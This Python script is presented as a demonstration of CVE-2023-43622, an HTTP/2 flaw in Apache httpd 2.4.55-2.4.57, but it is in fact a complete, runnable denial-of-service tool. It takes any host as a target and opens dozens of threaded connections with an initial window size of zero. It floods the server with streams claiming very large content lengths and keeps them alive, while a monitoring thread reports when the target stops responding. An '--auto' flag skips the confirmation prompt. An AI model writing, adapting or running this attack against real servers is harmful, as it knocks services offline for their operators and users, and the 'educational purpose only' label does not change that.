#!/usr/bin/env python3
"""
CVE-2023-43622 Slowloris Attack Demonstration

This script demonstrates CVE-2023-43622, a vulnerability in Apache HTTP Server 
versions 2.4.55-2.4.57 where an attacker can open HTTP/2 connections with 
initial window size of 0, causing the server to block handling indefinitely
and leading to resource exhaustion.

EDUCATIONAL PURPOSE ONLY - For understanding and defending against such attacks.
"""

import socket
import ssl
import time
import random
import sys
import argparse
import threading
import h2.connection
import h2.events
import h2.config
import h2.settings
import subprocess
from collections import defaultdict

class CVE2023_43622_Attack:
    """
    Implements the specific CVE-2023-43622 vulnerability exploitation.
    
    The attack works by:
    1. Opening HTTP/2 connections to Apache httpd
    2. Setting initial window size to 0 in connection settings
    3. Creating streams with large content-length
    4. Sending minimal data to keep connections alive
    5. Causing memory to grow until server runs out of resources
    """
    
    def __init__(self, target_host, target_port=80, connections=50):
        self.target_host = target_host
        self.target_port = target_port
        self.max_connections = connections
        self.connections = []
        self.stop_event = threading.Event()
        self.stats = {
            'connections_established': 0,
            'streams_created': 0,
            'connections_failed': 0,
            'total_memory_claimed': 0
        }
        
    def create_malicious_connection(self, connection_id):
        """
        Create a single malicious HTTP/2 connection exploiting CVE-2023-43622.
        """
        sock = None
        try:
            # Establish TCP connection
            sock = socket.create_connection((self.target_host, self.target_port), timeout=30)
            sock.settimeout(2.0)
            
            # Create HTTP/2 connection with malicious settings
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            
            # CVE-2023-43622: Set initial window size to 0
            # This causes the server to block handling this connection indefinitely
            malicious_settings = {
                h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 0,  # CVE-2023-43622 trigger
                h2.settings.SettingCodes.MAX_FRAME_SIZE: 16384,
                h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 100,
                h2.settings.SettingCodes.HEADER_TABLE_SIZE: 4096
            }
            
            # Initiate connection and send malicious settings
            conn.initiate_connection()
            conn.update_settings(malicious_settings)
            
            # Send connection preface and settings
            data_to_send = conn.data_to_send()
            sock.sendall(data_to_send)
            
            print(f"[+] CVE-2023-43622: Connection {connection_id} established with window size 0")
            self.stats['connections_established'] += 1
            
            # Handle server response to settings
            try:
                data = sock.recv(65535)
                if data:
                    events = conn.receive_data(data)
                    data_to_send = conn.data_to_send()
                    if data_to_send:
                        sock.sendall(data_to_send)
            except socket.timeout:
                pass
            
            # Create multiple streams to exhaust resources
            streams_per_connection = random.randint(20, 50)  # More aggressive
            stream_id = 1
            
            for i in range(streams_per_connection):
                try:
                    # Create stream with large content-length to consume memory
                    content_length = random.randint(10000000, 100000000)  # 10-100MB
                    self.stats['total_memory_claimed'] += content_length
                    
                    headers = [
                        (':method', 'POST'),
                        (':path', f'/cve-2023-43622/stream_{stream_id}'),
                        (':authority', self.target_host),
                        (':scheme', 'http'),
                        ('content-type', 'application/octet-stream'),
                        ('content-length', str(content_length)),
                        ('user-agent', 'CVE-2023-43622-PoC/1.0'),
                        ('connection', 'keep-alive')
                    ]
                    
                    # Send headers without END_STREAM flag
                    conn.send_headers(stream_id, headers, end_stream=False)
                    
                    # Send substantial initial data to actually consume memory
                    # CVE-2023-43622: window size 0 prevents server from processing, causing memory buildup
                    # HTTP/2 max frame size is typically 16KB, so send multiple frames
                    data_sent = 0
                    target_size = min(content_length, 131072)  # 128KB initial
                    
                    while data_sent < target_size:
                        chunk_size = min(16384, target_size - data_sent)  # 16KB max frame size
                        chunk_data = b'A' * chunk_size
                        conn.send_data(stream_id, chunk_data, end_stream=False)
                        data_sent += chunk_size
                    
                    # Send to server
                    data_to_send = conn.data_to_send()
                    if data_to_send:
                        sock.sendall(data_to_send)
                    
                    print(f"[+] Stream {stream_id} created: {content_length} bytes claimed (window size 0)")
                    self.stats['streams_created'] += 1
                    
                    stream_id += 2  # Client streams must be odd
                    time.sleep(0.1)  # Small delay between streams
                    
                except Exception as e:
                    print(f"[!] Failed to create stream {stream_id}: {e}")
                    break
            
            # Keep connection alive indefinitely (CVE-2023-43622 effect)
            # Server cannot reclaim memory until connection closes/timeouts
            connection_start = time.time()
            keepalive_interval = random.uniform(30, 60)  # 30-60 seconds
            
            while not self.stop_event.is_set():
                try:
                    # Check for server data (unlikely due to window size 0)
                    sock.settimeout(1.0)
                    try:
                        data = sock.recv(65535)
                        if not data:
                            print(f"[!] Connection {connection_id} closed by server after {time.time() - connection_start:.1f}s")
                            break
                        
                        # Process any events
                        events = conn.receive_data(data)
                        for event in events:
                            if isinstance(event, h2.events.ConnectionTerminated):
                                print(f"[!] Connection {connection_id} terminated by server (memory exhaustion success!)")
                                return
                            elif isinstance(event, h2.events.StreamReset):
                                print(f"[+] Stream reset on connection {connection_id} (server overload)")
                                
                    except socket.timeout:
                        pass
                    
                    # Send data continuously to fill server memory buffers (CVE-2023-43622)
                    current_time = time.time()
                    if current_time - connection_start > keepalive_interval:
                        try:
                            # Send more data on active streams to consume memory
                            # Use multiple 16KB frames to respect HTTP/2 limits
                            for i in range(2):  # Send 2 x 16KB = 32KB per keepalive
                                try:
                                    data_chunk = b'X' * 16384  # 16KB chunks (max frame size)
                                    conn.send_data(1, data_chunk, end_stream=False)  # Use stream 1
                                except Exception:
                                    pass
                            
                            # Also send PING frame to keep connection alive
                            conn.ping(b'CVE43622')
                            data_to_send = conn.data_to_send()
                            if data_to_send:
                                sock.sendall(data_to_send)
                            
                            keepalive_interval = current_time + random.uniform(10, 20)  # More frequent
                            print(f"[+] Connection {connection_id} memory fill sent ({current_time - connection_start:.1f}s alive)")
                            
                        except Exception as e:
                            print(f"[!] Memory fill failed for connection {connection_id}: {e}")
                            break
                    
                    time.sleep(5)  # Check every 5 seconds
                    
                except (ConnectionResetError, BrokenPipeError) as e:
                    elapsed = time.time() - connection_start
                    print(f"[!] Connection {connection_id} broken after {elapsed:.1f}s: {e}")
                    break
                except Exception as e:
                    print(f"[!] Connection {connection_id} error: {e}")
                    break
            
            elapsed = time.time() - connection_start
            print(f"[!] Connection {connection_id} finished after {elapsed:.1f}s")
            
        except Exception as e:
            print(f"[!] Failed to establish connection {connection_id}: {e}")
            self.stats['connections_failed'] += 1
        finally:
            if sock:
                sock.close()
    
    def monitor_server_impact(self):
        """Monitor the impact on the target server."""
        print("\n[*] Starting server impact monitoring...")
        
        while not self.stop_event.is_set():
            try:
                # Test server responsiveness
                start_time = time.time()
                test_sock = socket.create_connection((self.target_host, self.target_port), timeout=10)
                
                # Send simple HTTP/1.1 request to test responsiveness
                request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                test_sock.send(request.encode())
                
                response = test_sock.recv(1024)
                test_sock.close()
                
                response_time = time.time() - start_time
                
                if response_time > 5.0:
                    print(f"[!] CRITICAL: Server response time degraded to {response_time:.2f}s (CVE-2023-43622 impact)")
                elif response_time > 2.0:
                    print(f"[!] WARNING: Server response time elevated to {response_time:.2f}s")
                else:
                    print(f"[+] Server responding normally: {response_time:.2f}s")
                
            except socket.timeout:
                print(f"[!] CRITICAL: Server not responding (timeout) - CVE-2023-43622 DoS achieved!")
            except Exception as e:
                print(f"[!] CRITICAL: Server unreachable: {e} - CVE-2023-43622 DoS achieved!")
            
            time.sleep(15)  # Check every 15 seconds
    
    def print_stats(self):
        """Print current attack statistics."""
        while not self.stop_event.is_set():
            active_connections = sum(1 for t in self.connections if t.is_alive())
            memory_gb = self.stats['total_memory_claimed'] / (1024**3)
            
            print(f"\n=== CVE-2023-43622 Attack Statistics ===")
            print(f"Active connections: {active_connections}/{self.max_connections}")
            print(f"Connections established: {self.stats['connections_established']}")
            print(f"Connections failed: {self.stats['connections_failed']}")
            print(f"Streams created: {self.stats['streams_created']}")
            print(f"Memory claimed from server: {memory_gb:.2f} GB")
            print(f"Attack duration: {time.time() - self.attack_start_time:.1f} seconds")
            print("="*45)
            
            time.sleep(30)  # Update every 30 seconds
    
    def start_attack(self):
        """Start the CVE-2023-43622 attack."""
        print(f"[*] Starting CVE-2023-43622 attack against {self.target_host}:{self.target_port}")
        print(f"[*] Target: Apache httpd 2.4.55-2.4.57 (vulnerable versions)")
        print(f"[*] Attack method: HTTP/2 initial window size 0 resource exhaustion")
        print(f"[*] Connections: {self.max_connections}")
        print(f"[*] WARNING: This will cause memory exhaustion and DoS!")
        
        self.attack_start_time = time.time()
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_server_impact, daemon=True)
        monitor_thread.start()
        
        # Start statistics thread
        stats_thread = threading.Thread(target=self.print_stats, daemon=True)
        stats_thread.start()
        
        try:
            # Create attack connections
            for i in range(self.max_connections):
                if self.stop_event.is_set():
                    break
                    
                thread = threading.Thread(
                    target=self.create_malicious_connection,
                    args=(i,),
                    daemon=True
                )
                thread.start()
                self.connections.append(thread)
                
                # Stagger connection creation to avoid overwhelming our own system
                time.sleep(random.uniform(0.5, 2.0))
            
            print(f"[*] All {len(self.connections)} attack threads started")
            
            # Wait for connections to do their work
            while True:
                active = sum(1 for t in self.connections if t.is_alive())
                if active == 0:
                    print("[*] All attack connections completed")
                    break
                
                time.sleep(10)
                
                # Show progress
                print(f"[*] {active} attack connections still active...")
        
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack and cleanup."""
        print("[*] Stopping CVE-2023-43622 attack...")
        self.stop_event.set()
        
        # Wait for threads to finish
        for thread in self.connections:
            thread.join(timeout=5)
        
        print("[*] Attack stopped. Final statistics:")
        self.print_stats()

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2023-43622 Slowloris Attack Demonstration",
        epilog="This script demonstrates a serious vulnerability in Apache httpd 2.4.55-2.4.57"
    )
    parser.add_argument("target", help="Target hostname or IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--connections", type=int, default=50, 
                       help="Number of malicious connections (default: 50)")
    parser.add_argument("--auto", action="store_true", 
                       help="Run attack automatically without confirmation")
    
    args = parser.parse_args()
    
    print("CVE-2023-43622 Slowloris Attack Demonstration")
    print("=" * 50)
    print("EDUCATIONAL PURPOSE ONLY")
    print("This demonstrates a serious vulnerability in Apache httpd 2.4.55-2.4.57")
    print("The attack exploits HTTP/2 initial window size 0 to cause memory exhaustion")
    print("=" * 50)
    
    # Confirm target (unless auto mode)
    if not args.auto:
        response = input(f"\nTarget: {args.target}:{args.port}\nProceed with attack? (yes/no): ")
        if response.lower() != 'yes':
            print("Attack cancelled.")
            return
    else:
        print(f"\nTarget: {args.target}:{args.port}")
        print("Auto mode: Starting attack automatically...")
    
    # Create and start attack
    attack = CVE2023_43622_Attack(args.target, args.port, args.connections)
    attack.start_attack()

if __name__ == "__main__":
    main()